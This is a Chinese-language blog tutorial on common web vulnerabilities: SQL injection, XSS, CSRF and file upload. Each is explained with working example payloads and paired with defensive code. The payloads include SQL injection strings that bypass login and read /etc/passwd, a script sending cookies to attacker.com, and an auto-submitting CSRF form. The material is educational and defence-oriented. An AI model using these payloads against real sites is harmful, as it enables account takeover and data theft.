---
title: Web 安全入门指南：常见漏洞与防御
date: "2024-04-20"
excerpt: 从攻击者的视角理解 Web 安全，介绍 SQL 注入、XSS、CSRF 等常见漏洞的原理和防御方法。
category: 安全技术
tags: ["Web安全", "渗透测试", "漏洞"]
published: true
---

## 引言

Web 安全是网络安全领域的重要分支，也是我最感兴趣的方向之一。理解常见漏洞的原理，不仅能够帮助我们进行安全测试，更能指导我们编写更安全的代码。

本文将从攻击者的视角，介绍几种最常见的 Web 安全漏洞。

## SQL 注入（SQL Injection）

### 什么是 SQL 注入

SQL 注入是一种代码注入技术，攻击者通过在输入字段中插入恶意 SQL 语句，来操控数据库查询。

### 一个简单的例子

假设有一个登录接口：

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

攻击者输入：
- username: `admin'--`
- password: 任意值

生成的 SQL 变成：

```sql
SELECT * FROM users WHERE username='admin'--' AND password='xxx'
```

`--` 是 SQL 的注释符，后面的密码验证被注释掉了，攻击者无需知道密码就能以 admin 身份登录。

### 更严重的利用

```sql
-- 获取数据库版本
' UNION SELECT null,version(),null--

-- 获取所有表名
' UNION SELECT null,table_name,null FROM information_schema.tables--

-- 读取文件
' UNION SELECT null,load_file('/etc/passwd'),null--
```

### 防御方法

**1. 使用参数化查询（Prepared Statements）**

```python
# Python + SQLite 示例
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", 
               (username, password))
```

```php
// PHP + PDO 示例
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=:user AND password=:pass");
$stmt->execute(['user' => $username, 'pass' => $password]);
```

**2. 输入验证和过滤**

```python
import re

def validate_username(username):
    # 只允许字母数字下划线
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        raise ValueError("Invalid username")
    return username
```

**3. 最小权限原则**

数据库用户只应具有必要的权限，不要给应用连接用户使用 `GRANT ALL PRIVILEGES`。

## 跨站脚本攻击（XSS）

### XSS 的类型

**反射型 XSS（Reflected XSS）**

恶意脚本通过 URL 传递，需要诱骗用户点击链接。

```
https://example.com/search?q=<script>alert('XSS')</script>
```

**存储型 XSS（Stored XSS）**

恶意脚本被永久存储在目标服务器上，如评论、帖子等。

```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

**DOM 型 XSS（DOM-based XSS）**

通过修改页面的 DOM 结构来执行恶意脚本。

```javascript
// 有漏洞的代码
var hash = location.hash.slice(1);
document.write(hash);

// 攻击 URL: https://example.com#<img src=x onerror=alert(1)>
```

### XSS 的危害

- 窃取用户 Cookie，劫持会话
- 伪造用户操作
- 钓鱼攻击
- 键盘记录
- 挖矿脚本

### 防御方法

**1. 输出编码（Output Encoding）**

```python
from html import escape

user_input = '<script>alert("xss")</script>'
safe_output = escape(user_input)
# 结果: &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
```

**2. 内容安全策略（CSP）**

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
```

**3. HttpOnly Cookie**

```http
Set-Cookie: sessionid=xxx; HttpOnly; Secure; SameSite=Strict
```

## 跨站请求伪造（CSRF）

### 什么是 CSRF

攻击者诱导已登录用户在不知情的情况下执行非预期的操作。

### 攻击场景

假设用户已登录银行网站，攻击者构造如下页面：

```html
<form action="https://bank.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit()</script>
```

用户访问攻击者的页面，就会在不知情的情况下向攻击者转账。

### 防御方法

**1. CSRF Token**

```python
# 生成 Token
import secrets
csrf_token = secrets.token_urlsafe(32)

# 表单中包含 Token
<input type="hidden" name="csrf_token" value="{{ csrf_token }}">

# 验证 Token
if request.form['csrf_token'] != session['csrf_token']:
    abort(403)
```

**2. SameSite Cookie**

```http
Set-Cookie: sessionid=xxx; SameSite=Strict
```

**3. 验证 Referer/Origin**

```python
referer = request.headers.get('Referer')
if not referer or not referer.startswith('https://mysite.com'):
    abort(403)
```

## 文件上传漏洞

### 常见风险

- 上传 WebShell，获取服务器控制权
- 上传恶意脚本，执行 XSS
- 上传超大文件，导致 DOS

### 安全实践

```python
import os
import magic
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def validate_file(file):
    # 1. 检查文件名
    filename = secure_filename(file.filename)
    if not allowed_file(filename):
        raise ValueError("File type not allowed")
    
    # 2. 检查文件大小
    file.seek(0, os.SEEK_END)
    size = file.tell()
    file.seek(0)
    if size > MAX_FILE_SIZE:
        raise ValueError("File too large")
    
    # 3. 检查 MIME 类型
    mime = magic.from_buffer(file.read(1024), mime=True)
    file.seek(0)
    if not mime.startswith('image/'):
        raise ValueError("Invalid file content")
    
    # 4. 存储到非 web 目录，或使用随机文件名
    storage_name = secrets.token_hex(16) + os.path.splitext(filename)[1]
    
    return storage_name
```

## 总结

Web 安全是一个广阔的领域，本文介绍的只是冰山一角。作为安全学习者，我建议：

1. **理解原理**：不要只记住攻击 payload，要理解背后的原理
2. **动手实践**：搭建漏洞环境（如 DVWA、Pikachu）亲自测试
3. **关注防御**：攻击和防御是一体两面，要同时学习
4. **持续学习**：安全领域不断发展，要保持学习的心态

后续我会继续分享更多 Web 安全相关的学习和实践经验，敬请期待。
